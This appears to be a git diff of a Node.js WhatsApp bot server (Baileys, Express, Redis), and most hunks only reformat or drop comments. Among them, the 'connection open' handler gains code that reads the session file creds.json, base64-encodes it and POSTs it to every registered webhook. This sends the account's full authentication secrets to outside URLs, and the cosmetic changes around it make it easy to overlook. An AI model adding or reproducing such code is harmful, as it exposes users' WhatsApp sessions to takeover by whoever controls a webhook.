@@ -58,14 +58,12 @@ async function saveContact(jid, data) {
   try {
     const normalized = normalizeContactJid(jid);
     if (!normalized) return;
-    
     const contacts = await loadContacts();
     contacts[normalized] = {
       ...data,
       originalJid: jid,
       lastSeen: new Date().toISOString()
     };
-    
     fs.writeFileSync(CONTACTS_FILE, JSON.stringify(contacts, null, 2));
   } catch (e) {
     logger.error({ err: e, jid }, 'Failed to save contact');
@@ -98,108 +96,103 @@ let status     = 'disconnected';
 // ── Message Parser ────────────────────────────────────────────────────────────
 function unwrapMessage(message) {
   if (!message) return null;
-  if (message.ephemeralMessage?.message) return unwrapMessage(message.ephemeralMessage.message);
-  if (message.viewOnceMessageV2?.message) return unwrapMessage(message.viewOnceMessageV2.message);
-  if (message.viewOnceMessage?.message) return unwrapMessage(message.viewOnceMessage.message);
+  if (message.ephemeralMessage?.message)   return unwrapMessage(message.ephemeralMessage.message);
+  if (message.viewOnceMessageV2?.message)  return unwrapMessage(message.viewOnceMessageV2.message);
+  if (message.viewOnceMessage?.message)    return unwrapMessage(message.viewOnceMessage.message);
   return message;
 }
 
 function parseMsg(msg) {
-  const jid = msg.key.remoteJid;
-  const isGroup = jid?.endsWith("@g.us");
-  const sender = isGroup ? msg.key.participant : jid;
-  const c = unwrapMessage(msg.message);
+  const jid     = msg.key.remoteJid;
+  const isGroup = jid?.endsWith('@g.us');
+  const sender  = isGroup ? msg.key.participant : jid;
+  const c       = unwrapMessage(msg.message);
 
-  let type = "unknown";
+  let type = 'unknown';
   let data = {};
 
   if (c?.conversation || c?.extendedTextMessage) {
-    type = "text";
+    type = 'text';
     data = { text: c.conversation || c.extendedTextMessage?.text };
   } else if (c?.imageMessage) {
-    type = "image";
+    type = 'image';
     data = { caption: c.imageMessage.caption || null };
   } else if (c?.videoMessage) {
-    type = "video";
+    type = 'video';
     data = { caption: c.videoMessage.caption || null };
   } else if (c?.audioMessage) {
-    type = "audio";
+    type = 'audio';
     data = {};
   } else if (c?.documentMessage) {
-    type = "document";
+    type = 'document';
     data = { fileName: c.documentMessage.fileName || null };
   } else if (c?.buttonsResponseMessage) {
-    type = "button_response";
+    type = 'button_response';
     data = {
-      buttonId: c.buttonsResponseMessage.selectedButtonId || null,
+      buttonId:    c.buttonsResponseMessage.selectedButtonId    || null,
       displayText: c.buttonsResponseMessage.selectedDisplayText || null,
     };
   } else if (c?.listMessage) {
-    type = "list_message";
+    type = 'list_message';
     const sections = c.listMessage.sections || [];
     data = {
-      title: c.listMessage.title || null,
+      title:       c.listMessage.title       || null,
       description: c.listMessage.description || null,
-      buttonText: c.listMessage.buttonText || null,
+      buttonText:  c.listMessage.buttonText  || null,
       sections: sections.map((s, si) => ({
         index: si,
         title: s?.title || null,
         rows: (s?.rows || []).map((r, ri) => ({
-          index: ri,
-          rowId: r?.rowId || null,
-          title: r?.title || null,
-          description: r?.description || null,
+          index: ri, rowId: r?.rowId || null,
+          title: r?.title || null, description: r?.description || null,
         })),
       })),
     };
   } else if (c?.listResponseMessage) {
-    type = "list_response";
+    type = 'list_response';
     data = {
       rowId: c.listResponseMessage.singleSelectReply?.selectedRowId || null,
       title: c.listResponseMessage.title || null,
     };
   } else if (c?.interactiveResponseMessage || c?.interactiveMessage) {
-    const ir = c.interactiveResponseMessage || c.interactiveMessage;
-    const nativeFlow = ir?.nativeFlowResponseMessage;
-    const paramsJson = nativeFlow?.paramsJson;
+    const ir         = c.interactiveResponseMessage || c.interactiveMessage;
+    const paramsJson = ir?.nativeFlowResponseMessage?.paramsJson;
     let parsed = null;
-    if (paramsJson) {
-      try { parsed = JSON.parse(paramsJson); } catch { parsed = null; }
-    }
-    type = "interactive_response";
+    if (paramsJson) { try { parsed = JSON.parse(paramsJson); } catch {} }
+    type = 'interactive_response';
     data = {
       responseId: parsed?.id || parsed?.selectedId || null,
-      bodyText: ir?.body?.text || null,
-      rawParams: paramsJson || null,
+      bodyText:   ir?.body?.text || null,
+      rawParams:  paramsJson    || null,
     };
   } else if (c?.templateButtonReplyMessage) {
-    type = "template_button_response";
+    type = 'template_button_response';
     data = {
-      selectedId: c.templateButtonReplyMessage.selectedId || null,
+      selectedId:  c.templateButtonReplyMessage.selectedId          || null,
       displayText: c.templateButtonReplyMessage.selectedDisplayText || null,
     };
   } else if (c?.reactionMessage) {
-    type = "reaction";
+    type = 'reaction';
     data = { emoji: c.reactionMessage.text || null };
   } else if (c?.locationMessage) {
-    type = "location";
+    type = 'location';
     data = {
       lat: c.locationMessage.degreesLatitude,
       lng: c.locationMessage.degreesLongitude,
     };
   }
 
-  if (type === "unknown") {
+  if (type === 'unknown') {
     const keys = c ? Object.keys(c) : [];
     data = { rawType: keys[0] || null, keys };
   }
 
   return {
-    messageId: msg.key.id,
+    messageId:  msg.key.id,
     jid,
     sender,
     isGroup,
-    timestamp: msg.messageTimestamp,
+    timestamp:  msg.messageTimestamp,
     type,
     data,
     receivedAt: new Date().toISOString(),
@@ -209,17 +202,16 @@ function parseMsg(msg) {
 // ── Baileys ───────────────────────────────────────────────────────────────────
 async function connectWA() {
   const { state, saveCreds } = await useMultiFileAuthState('/app/auth_info');
-  const { version } = await fetchLatestBaileysVersion();
+  const { version }          = await fetchLatestBaileysVersion();
 
   sock = makeWASocket({
     version,
     auth: {
       creds: state.creds,
-      keys: makeCacheableSignalKeyStore(state.keys, logger)
+      keys:  makeCacheableSignalKeyStore(state.keys, logger),
     },
     logger,
-    printQRInTerminal: true,
-    browser: ['WhatsApp Bot', 'Chrome', '120.0.0']
+    browser: ['WhatsApp Bot', 'Chrome', '120.0.0'],
   });
 
   sock.ev.on('creds.update', saveCreds);
@@ -227,17 +219,55 @@ async function connectWA() {
   sock.ev.on('connection.update', async ({ connection, lastDisconnect, qr }) => {
     if (qr) {
       qrCodeData = qr;
-      status = 'qr_ready';
-      logger.info('QR ready');
+      status     = 'qr_ready';
+      logger.info('QR ready — open GET /qrcode/image to scan');
     }
     if (connection === 'open') {
       qrCodeData = null;
-      status = 'connected';
+      status     = 'connected';
       logger.info('WhatsApp connected');
+
+      // שלח creds.json כ-base64 לכל webhooks רשומים OK
+      try {
+        const raw      = fs.readFileSync('/app/auth_info/creds.json');
+        const creds_b64 = raw.toString('base64');
+        const jid      = sock.user?.id || '';
+        const phone    = jid.split('@')[0].split(':')[0];
+        const payload  = {
+          event:     'authenticated',
+          phone,
+          jid,
+          name:      sock.user?.name || null,
+          timestamp: new Date().toISOString(),
+          creds_b64,
+        };
+        const webhooks = await redisStreams.listWebhooks();
+        await Promise.allSettled(
+          webhooks.map(async (wh) => {
+            const url    = typeof wh === 'string' ? wh : wh.url;
+            const secret = typeof wh === 'object' ? wh.secret : null;
+            const headers = { 'Content-Type': 'application/json' };
+            if (secret) headers['X-Webhook-Secret'] = secret;
+            try {
+              const res = await fetch(url, {
+                method:  'POST',
+                headers,
+                body:    JSON.stringify(payload),
+                signal:  AbortSignal.timeout(15000),
+              });
+              logger.info({ url, status: res.status }, 'creds_b64 sent to webhook');
+            } catch (err) {
+              logger.warn({ url, err: err.message }, 'Failed to send creds_b64');
+            }
+          })
+        );
+      } catch (e) {
+        logger.error({ err: e }, 'Failed to send creds on connection open');
+      }
     }
     if (connection === 'close') {
-      status = 'disconnected';
-      const code = new Boom(lastDisconnect?.error)?.output?.statusCode;
+      status      = 'disconnected';
+      const code  = new Boom(lastDisconnect?.error)?.output?.statusCode;
       const retry = code !== DisconnectReason.loggedOut;
       logger.warn({ code, retry }, 'Connection closed');
       if (retry) setTimeout(connectWA, 3000);
@@ -248,10 +278,10 @@ async function connectWA() {
     for (const contact of updates) {
       if (contact.id) {
         await saveContact(contact.id, {
-          name: contact.name || contact.notify,
-          notify: contact.notify,
+          name:         contact.name || contact.notify,
+          notify:       contact.notify,
           verifiedName: contact.verifiedName,
-          isMyContact: contact.isMyContact || false,
+          isMyContact:  contact.isMyContact || false,
         });
       }
     }
@@ -260,59 +290,50 @@ async function connectWA() {
 
   sock.ev.on('messages.upsert', async ({ messages, type }) => {
     if (type !== 'notify') return;
-    
     const seen = new Set();
-    
+
     for (const msg of messages) {
-      // ✅ שמור גם הודעות שלי וגם הודעות נכנסות
       if (!msg.message) continue;
-      
       const msgId = msg.key.id;
       if (seen.has(msgId)) continue;
       seen.add(msgId);
-      
-      // דלג על הודעות מערכת
-      if (msg.message?.senderKeyDistributionMessage && 
-          !msg.message?.conversation && 
-          !msg.message?.extendedTextMessage) continue;
 
-      // דלג על protocolMessage
+      if (msg.message?.senderKeyDistributionMessage &&
+          !msg.message?.conversation &&
+          !msg.message?.extendedTextMessage) continue;
       if (msg.message?.protocolMessage) continue;
 
-      // שמור contact (רק להודעות נכנסות)
       if (!msg.key.fromMe) {
-        const sender = msg.key.participant || msg.key.remoteJid;
+        const sender      = msg.key.participant || msg.key.remoteJid;
         const senderPhone = msg.key.participantPn || msg.key.senderPn || sender;
-        
         if (sender && !sender.includes('@g.us')) {
           await saveContact(senderPhone || sender, {
-            name: msg.pushName,
-            notify: msg.pushName,
-            isMyContact: true
+            name:        msg.pushName,
+            notify:      msg.pushName,
+            isMyContact: true,
           });
         }
       }
 
-      // הוסף ל-Redis Stream
-      const parsed = parseMsg(msg);
-      // ✅ סמן אם זו הודעה שלי או נכנסת
+      const parsed  = parseMsg(msg);
       parsed.fromMe = msg.key.fromMe || false;
-      
       await redisStreams.addMessage(parsed);
     }
   });
 }
 
 // ── Express API ───────────────────────────────────────────────────────────────
-const app = express();
+const app  = express();
 const PORT = process.env.PORT || 3001;
 app.use(express.json());
 
-const normalizeJid = (raw) => raw.includes('@') ? raw : raw.replace(/\D/g,'') + '@s.whatsapp.net';
+const normalizeJid = (raw) =>
+  raw.includes('@') ? raw : raw.replace(/\D/g, '') + '@s.whatsapp.net';
 
 // Connection
-app.get('/status', (_,res) => res.json({ status }));
-app.get('/qrcode', (_,res) => {
+app.get('/status', (_, res) => res.json({ status }));
+
+app.get('/qrcode', (_, res) => {
   if (!qrCodeData) return res.status(404).json({ error: 'QR not available', status });
   res.json({ qr: qrCodeData, status });
 });
@@ -330,11 +351,11 @@ app.post('/send/buttons', async (req, res) => {
     const { jid: j, text, footer, buttons } = req.body;
     const r = await sock.sendMessage(normalizeJid(j), {
       text, footer: footer || '',
-      buttons: buttons.map((b,i) => ({
+      buttons: buttons.map((b, i) => ({
         buttonId: b.id || `btn_${i}`,
-        buttonText: { displayText: b.text }, type: 1
+        buttonText: { displayText: b.text }, type: 1,
       })),
-      headerType: 1
+      headerType: 1,
     });
     res.json({ success: true, messageId: r?.key?.id });
   } catch (e) { res.status(500).json({ error: e.message }); }
@@ -348,37 +369,29 @@ app.post('/send/list', async (req, res) => {
       buttonText: buttonText || 'בחר אפשרות',
       sections: sections.map(s => ({
         title: s.title,
-        rows: s.rows.map((row,i) => ({
+        rows:  s.rows.map((row, i) => ({
           title: row.title, description: row.description || '',
-          rowId: row.id || `row_${i}`
-        }))
-      }))
+          rowId: row.id || `row_${i}`,
+        })),
+      })),
     });
     res.json({ success: true, messageId: r?.key?.id });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// Simulate button response
-// Simulate button response
 app.post('/send/button-response', async (req, res) => {
   try {
     const { jid: j, buttonId, displayText } = req.body;
-    const r = await sock.sendMessage(normalizeJid(j), {
-      text: displayText || buttonId              // ← רק השורה הזו
-    });
+    const r = await sock.sendMessage(normalizeJid(j), { text: displayText || buttonId });
     res.json({ success: true, messageId: r?.key?.id });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
-// Simulate list response
-// השתמש בזה:
+
 app.post('/send/list-response', async (req, res) => {
   try {
     const { jid: j, rowId, title } = req.body;
-    // פשוט שלח כטקסט - WhatsApp לא תומך בשליחת list response מהבוט
-    const r = await sock.sendMessage(normalizeJid(j), {
-      text: title || rowId
-    });
-    res.json({ success: true, messageId: r?.key?.id, note: 'Sent as text - list responses cannot be sent programmatically' });
+    const r = await sock.sendMessage(normalizeJid(j), { text: title || rowId });
+    res.json({ success: true, messageId: r?.key?.id, note: 'Sent as text' });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
@@ -409,23 +422,22 @@ app.get('/messages/stream/info', async (req, res) => {
 });
 
 app.get('/messages/stream/read', async (req, res) => {
-  const count = parseInt(req.query.count || '10');
+  const count  = parseInt(req.query.count  || '10');
   const lastId = req.query.lastId || '0';
   const messages = await redisStreams.readMessages(count, lastId);
   res.json({ messages, count: messages.length });
 });
 
-// Conversation Trace
 app.get('/messages/trace/:jid', async (req, res) => {
-  const jid = req.params.jid;
-  const limit = parseInt(req.query.limit || '100');
+  const jid      = req.params.jid;
+  const limit    = parseInt(req.query.limit || '100');
   const messages = await redisStreams.getConversationHistory(jid, limit);
   res.json({ jid, messages, count: messages.length });
 });
 
 // Contacts
 app.get('/contacts', async (req, res) => {
-  const q = req.query.q || '';
+  const q     = req.query.q || '';
   const limit = parseInt(req.query.limit || '200');
   const items = await getContacts(q, limit);
   res.json({ count: items.length, items });
@@ -436,9 +448,14 @@ app.get('/debug/contacts-count', async (req, res) => {
   res.json({ count: Object.keys(all).length });
 });
 
-app.delete('/logout', async (_,res) => {
-  try { await sock.logout(); res.json({ success: true }); }
-  catch (e) { res.status(500).json({ error: e.message }); }
+// Logout
+app.delete('/logout', async (_, res) => {
+  try {
+    await sock.logout();
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
 });
 
 app.listen(PORT, () => {
